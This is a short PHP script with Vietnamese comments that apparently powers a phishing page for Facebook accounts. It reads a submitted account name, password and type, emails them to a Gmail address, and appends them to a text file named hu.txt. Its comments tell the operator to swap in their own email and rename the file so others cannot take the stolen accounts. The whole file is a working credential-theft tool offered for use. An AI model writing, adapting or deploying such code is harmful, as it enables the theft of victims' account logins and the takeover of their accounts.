<?php 
if(isset($_POST["acc"])){
//   $type=='';
    $acc = $_POST["acc"];
    $pass = $_POST["pass"];
    $type = $_POST["type"];
     $subject = "Cảm ơn bạn đã sử dụng code!";
     $headers = "Tài khoản facebook";
    $body = "\nTài Khoản $type :$acc\nMật Khẩu :$pass\n";
      mail("ocbodqd@gmail.com", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
    $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
    fwrite($test,$body);
    fclose($test);
}
    ?>
